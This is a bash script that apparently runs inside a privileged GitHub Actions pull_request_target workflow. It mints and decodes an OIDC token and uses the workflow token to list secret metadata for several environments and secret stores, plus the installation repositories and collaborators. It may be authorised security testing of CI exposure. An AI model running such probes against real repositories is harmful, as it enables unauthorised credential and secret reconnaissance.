#!/usr/bin/env bash
# i10413 round-4: OIDC minting + environment secret surface, inside pr-target.yml (write-all)
set +e
T="$GITHUB_TOKEN"; R="$GITHUB_REPOSITORY"; API="https://api.github.com"
echo "I10413D_START repo=$R run=$GITHUB_RUN_ID"

api(){ m="$1"; u="$2"; shift 2; c=$(curl -s -o /tmp/b -w '%{http_code}' -X "$m" -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" "$u" "$@"); echo ">>> [$m] $u => $c"; head -c 700 /tmp/b | tr '\n' ' '; echo; }

echo "=== (c) OIDC token minting ==="
echo "id_token_url_set=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && echo yes || echo no)"
echo "id_token_req_set=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo yes || echo no)"
if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
  curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=i10413" -o /tmp/oidc.json -w "oidc_http=%{http_code}\n"
  python3 - <<'PY'
import json,base64
try:
    d=json.load(open('/tmp/oidc.json')); t=d.get('value','')
    print("oidc_token_len", len(t))
    p=t.split('.')
    if len(p)>=2:
        pad=p[1]+'='*(-len(p[1])%4)
        c=json.loads(base64.urlsafe_b64decode(pad))
        print(json.dumps({k:c.get(k) for k in ['iss','sub','aud','repository','repository_owner','actor','ref','event_name','environment','job_workflow_ref','runner_environment']}, indent=1))
except Exception as e:
    print("oidc_err", e)
PY
fi

echo "=== (c2) environment-scoped secret metadata ==="
for e in prod exp-10554 exp-10554-owner-StephenClash i10537-dep; do
  api GET "$API/repos/$R/environments/$e/secrets"
  api GET "$API/repos/$R/environments/$e"
done

echo "=== (c3) other secret stores ==="
api GET "$API/repos/$R/actions/secrets"
api GET "$API/repos/$R/dependabot/secrets"
api GET "$API/repos/$R/codespaces/secrets"

echo "=== runner/token introspection ==="
api GET "$API/user"          # expect 403 integration
api GET "$API/installation/repositories"
api GET "$API/repos/$R/collaborators?per_page=5"

echo "I10413D_END"
